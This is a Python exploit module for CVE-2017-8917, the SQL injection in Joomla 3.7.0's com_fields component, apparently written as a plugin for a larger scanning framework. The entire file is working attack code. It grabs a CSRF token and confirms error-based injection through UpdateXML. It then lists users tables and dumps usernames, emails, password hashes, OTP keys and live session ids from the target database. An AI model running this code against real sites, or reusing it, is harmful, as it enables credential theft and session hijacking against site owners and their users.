#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import sys
import re
import random
import binascii
import urllib3
from pub.com.reqset import ReqSet
urllib3.disable_warnings()


class Cve_2017_8917:
    def extract_token(self, resp):
        match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
        if match is None:
            print(" [!] Cannot find CSRF token")
            return None
        return match.group(1)

    def build_sqli(self, colname, morequery):
        return "(SELECT " + colname + " " + morequery + ")"

    def joomla_370_sqli_extract(self, url, sess, token, colname, morequery):
        sqli = self.build_sqli("LENGTH(" + colname + ")", morequery)
        length = self.joomla_370_sqli(url, sess, token, sqli)
        if not length:
            return None
        length = int(length)
        maxbytes = 30
        offset = 0
        result = ''
        while length > offset:
            sqli = self.build_sqli("HEX(MID(%s,%d,%d))" % (colname, offset + 1, 16), morequery)
            value = self.joomla_370_sqli(url, sess, token, sqli)
            if not value:
                print(" [!] Failed to retrieve string for query:", sqli)
                return None
            value = binascii.unhexlify(value).decode("utf-8")
            result += value
            offset += len(value)
        return result

    def joomla_370_sqli(self, url, sess, token, sqli):
        sqli_full = "UpdateXML(2, concat(0x3a," + sqli + ", 0x3a), 1)"
        data = {
            'option': 'com_fields',
            'view': 'fields',
            'layout': 'modal',
            'list[fullordering]': sqli_full,
            token: '1',
        }
        resp = sess.get(url + "/index.php?option=com_fields&view=fields&layout=modal", params=data,
                        allow_redirects=False,headers=self.headers,proxies=self.proxy)
        try:
            match = re.search(r'XPATH syntax error:\s*&#039;([^$\n]+)\s*&#039;\s*</bl', resp.text, re.S)
            if match:
                match = match.group(1).strip()
                if match[0] != ':' and match[-1] != ':':
                    return None
                return match[1:-1]
        except Exception:
            return None

    def extract_joomla_tables(self, url, sess, token):
        tables = list()
        first = False
        offset = 0
        while True:
            result = self.joomla_370_sqli_extract(url, sess, token, "TABLE_NAME",
                                                  "FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT " + str(
                                                      offset) + ",1")
            if result is None:
                if first:
                    print("[!] Failed to retrieve first table name!")
                    return False
                break
            tables.append(result)
            print("  -  Found table:", result)
            first = False
            offset += 1
        return tables

    def extract_joomla_users(self, url, sess, token, table_name):
        users = list()
        offset = 0
        first = False
        print("  -  Extracting users from", table_name)
        while True:
            result = self.joomla_370_sqli_extract(url, sess, token,
                                                  "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)",
                                                  "FROM %s ORDER BY registerDate ASC LIMIT %d,1" % (table_name, offset))
            if result is None:
                if first:
                    print("[!] Failed to retrieve user from table!")
                    return False
                break
            result = result.split('|')
            print(" [$] Found user", result)
            first = False
            offset += 1
            users.append(result)
        return users

    def extract_joomla_sessions(self, url, sess, token, table_name):
        sessions = list()
        offset = 0
        first = False
        print("  -  Extracting sessions from", table_name)
        while True:
            result = self.joomla_370_sqli_extract(url, sess, token, "CONCAT(userid,0x7c,session_id,0x7c,username)",
                                                  "FROM %s WHERE guest = 0 LIMIT %d,1" % (table_name, offset))
            if result is None:
                if first:
                    print("[!] Failed to retrieve session from table!")
                    return False
                break
            result = result.split('|')
            print(" [$] Found session", result)
            first = False
            offset += 1
            sessions.append(result)
        return sessions

    def pwn_joomla_again(self, url):
        sess = requests.Session()

        print(" [-] Fetching CSRF token")
        resp = sess.get(url + "/index.php/component/users/?view=login",headers=self.headers,proxies=self.proxy)
        token = self.extract_token(resp)
        if not token:
            return False

        # Verify that we can perform SQLi
        print(" [-] Testing SQLi")
        result = self.joomla_370_sqli(url, sess, token, "128+127")
        if result != "255":
            print(" [!] Could not find SQLi output!")
            return False

        tables = self.extract_joomla_tables(url, sess, token)

        for table_name in tables:
            table_prefix = table_name[:-5]
            self.extract_joomla_users(url, sess, token, table_name)
            self.extract_joomla_sessions(url, sess, token, table_prefix + 'session')

        return True

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [31, 32, 33, 34, 35, 36]

        logo = """                                                                                                                    
		.---.    .-'''-.        .-'''-.                                                           
		|   |   '   _    \     '   _    \                            .---.                        
		'---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
		.---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
		|   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
		|   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
		|   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
		|   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
		|   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
		|   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
	 __.'   '                                              |/\'..' / '---'/ /   | |_| |     | |   
	|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
	|____.'                                                                `--'  `" '---'   '---' 
	"""
        for line in logo.split("\n"):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        # time.sleep(0.05)

    def main(self, target):
        url = target["url"].strip('/ ')
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy)
        self.print_logo()
        self.pwn_joomla_again(url)
